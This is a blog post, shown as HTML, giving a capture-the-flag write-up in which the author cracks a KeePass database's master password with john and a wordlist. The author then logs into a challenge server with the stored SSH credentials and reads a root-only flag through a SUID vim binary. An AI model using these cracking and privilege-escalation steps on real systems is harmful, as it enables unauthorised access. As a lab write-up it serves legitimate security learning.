<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="For this challenge, we are given three files: A PDF that explains the lore/backstory of our task, an ISO file, and a wordlist that seems to be a derivitive of the rockyou.txt wordlist.
The first thing I did was mount the ISO file to my file system to see its contents:
$ sudo mount -o loop CTG-2021-02-19-001.iso /mnt/disk $ cd /mnt/disk $ ls lost&#43;found rhodgson.kdbx Interesting, we have a keepass password database." />
<meta name="keywords" content=", osuleague, ctf, security" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="/blog/rayhanns_return/" />


    <title>
        
            OSU League 2020/2021 - rayhanns_return Writeup :: Cameron McCawley 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">






<meta itemprop="name" content="OSU League 2020/2021 - rayhanns_return Writeup">
<meta itemprop="description" content="For this challenge, we are given three files: A PDF that explains the lore/backstory of our task, an ISO file, and a wordlist that seems to be a derivitive of the rockyou.txt wordlist.
The first thing I did was mount the ISO file to my file system to see its contents:
$ sudo mount -o loop CTG-2021-02-19-001.iso /mnt/disk $ cd /mnt/disk $ ls lost&#43;found rhodgson.kdbx Interesting, we have a keepass password database."><meta itemprop="datePublished" content="2021-02-22T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2021-02-22T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="657"><meta itemprop="image" content=""/>
<meta itemprop="keywords" content="osuleague,ctf,security," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content=""/>

<meta name="twitter:title" content="OSU League 2020/2021 - rayhanns_return Writeup"/>
<meta name="twitter:description" content="For this challenge, we are given three files: A PDF that explains the lore/backstory of our task, an ISO file, and a wordlist that seems to be a derivitive of the rockyou.txt wordlist.
The first thing I did was mount the ISO file to my file system to see its contents:
$ sudo mount -o loop CTG-2021-02-19-001.iso /mnt/disk $ cd /mnt/disk $ ls lost&#43;found rhodgson.kdbx Interesting, we have a keepass password database."/>



    <meta property="og:title" content="OSU League 2020/2021 - rayhanns_return Writeup" />
<meta property="og:description" content="For this challenge, we are given three files: A PDF that explains the lore/backstory of our task, an ISO file, and a wordlist that seems to be a derivitive of the rockyou.txt wordlist.
The first thing I did was mount the ISO file to my file system to see its contents:
$ sudo mount -o loop CTG-2021-02-19-001.iso /mnt/disk $ cd /mnt/disk $ ls lost&#43;found rhodgson.kdbx Interesting, we have a keepass password database." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/blog/rayhanns_return/" /><meta property="og:image" content=""/><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2021-02-22T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-02-22T00:00:00&#43;00:00" /><meta property="og:site_name" content="Cameron McCawley" />







    <meta property="article:published_time" content="2021-02-22 00:00:00 &#43;0000 UTC" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">cd ~/cameronmccawley</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/blog/">Blog</a></li><li><a href="/resume.pdf">Resume</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="/blog/rayhanns_return/">OSU League 2020/2021 - rayhanns_return Writeup</a></h2>

            

            <div class="post-content">
                <p>For this challenge, we are given three files: A PDF that explains the lore/backstory of our task, an ISO file, and a wordlist that seems to be a derivitive of the <code>rockyou.txt</code> wordlist.</p>
<p>The first thing I did was mount the ISO file to my file system to see its contents:</p>
<pre><code>$ sudo mount -o loop CTG-2021-02-19-001.iso /mnt/disk
$ cd /mnt/disk
$ ls
lost+found  rhodgson.kdbx
</code></pre><p>Interesting, we have a keepass password database. Let&rsquo;s see if we can open it:</p>
<pre><code>$ kpcli --kdb rhodgson.kdbx 
Please provide the master password: *************************
Couldn't load the file rhodgson.kdbx: Missing pass
</code></pre><p>Dang, looks like we need to know the master password&hellip;. Or do we? (Insert Vsauce music)</p>
<p>We were given a password list right at the start, maybe we can use that to try and crack the password. Using johntheripper&rsquo;s <code>keepass2john</code>, we can convert this kee pass db into a hash format that john can try to crack:</p>
<pre><code>$ ./keepass2john /mnt/disk/rhodgson.kdbx &gt; hash.txt
$ john --wordlist=CTG_STANDARD_WORDLIST.txt  hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1hodgson         (rhodgson)
1g 0:00:00:20 DONE (2021-02-20 18:12) 0.04803g/s 135.2p/s 135.2c/s 135.2C/s prield28..pinkphone98
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
</code></pre><p>And there we go! We have the password to the kee pass file, <code>1hodgson</code>.</p>
<p>We can use that password and begin navigating the database.</p>
<pre><code>Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help &lt;command&gt;' for details on individual commands.

kpcli:/&gt; ls
=== Groups ===
rhodgson/
kpcli:/&gt; cd rhodgson/
kpcli:/rhodgson&gt; ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
=== Entries ===
0. My Flag Box                                               34.216.68.186
kpcli:/rhodgson&gt; show -f My\ Flag\ Box 

 Path: /rhodgson/
Title: My Flag Box
Uname: ubuntu
 Pass: As.3S;d0cvAS3kmm3VI(N
  URL: 34.216.68.186
Notes: This aws thing is maybe useless cause I was messing with permissions, and now I cannot print the flag, and dont understand what I did when I was messing around with SUID bits. https://imgflip.com/i/4yladl

kpcli:/rhodgson&gt; 
</code></pre><p>We have an aws box with the password!!  Default user on aws ubuntu boxes is <code>ubuntu</code>, so let&rsquo;s try to SSH into <code>34.216.68.186</code> as that user and with that password:</p>
<pre><code>ubuntu@ip-172-31-24-45 / % ls
bin   dev  home  lib32	libx32	    media  opt	 root  sbin  srv  tmp  var
boot  etc  lib	 lib64	lost+found  mnt    proc  run   snap  sys  usr
</code></pre><p>We are in! Let&rsquo;s start looking for the flag:</p>
<pre><code>ubuntu@ip-172-31-24-45 ~ % ls -lah
total 180K
drwxr-xr-x 7 ubuntu ubuntu 4.0K Feb 21 02:48 .
drwxr-xr-x 4 root   root   4.0K Feb 18 10:27 ..
-rw------- 1 ubuntu ubuntu   61 Feb 20 03:44 .Xauthority
-rw------- 1 ubuntu ubuntu 1.8K Feb 20 04:10 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3.7K Feb 25  2020 .bashrc
drwx------ 2 ubuntu ubuntu 4.0K Feb 18 09:53 .cache
drwx------ 3 ubuntu ubuntu 4.0K Feb 20 06:37 .config
-rw------- 1 root   root     28 Feb 19 02:56 .flag

ubuntu@ip-172-31-24-45 ~ % cat .flag
cat: .flag: Permission denied
</code></pre><p>After a little digging, I was able to find <code>.flag</code> hidden in the home directory of ubuntu. But the file is only readable by root :/</p>
<p>Usually with boxes like this, the first thing I look for is any SETUID binarys that I could use to priv esc or read certain files, so let&rsquo;s try that:</p>
<pre><code>ubuntu@ip-172-31-24-45 ~ % find / -perm -4000 2&gt;/dev/null           
...
/usr/bin/at
/usr/bin/sudo
/usr/bin/vim.basic
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
</code></pre><p>Sweet! We have vim as a SETUID, that means we can just read the flag with root privileges by doing <code>$ vim .flag</code>:</p>
<p>And we get the flag!</p>
<p><code>osu{rAyh44n_is_b4d_@_0ps3c}</code></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
  				<p>
  					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="tags/osuleague">osuleague</a></span><span class="tag"><a href="tags/ctf">ctf</a></span><span class="tag"><a href="tags/security">security</a></span>
  				</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            
            
                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            
            <span> <a href="posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>




		
    </body>
</html>
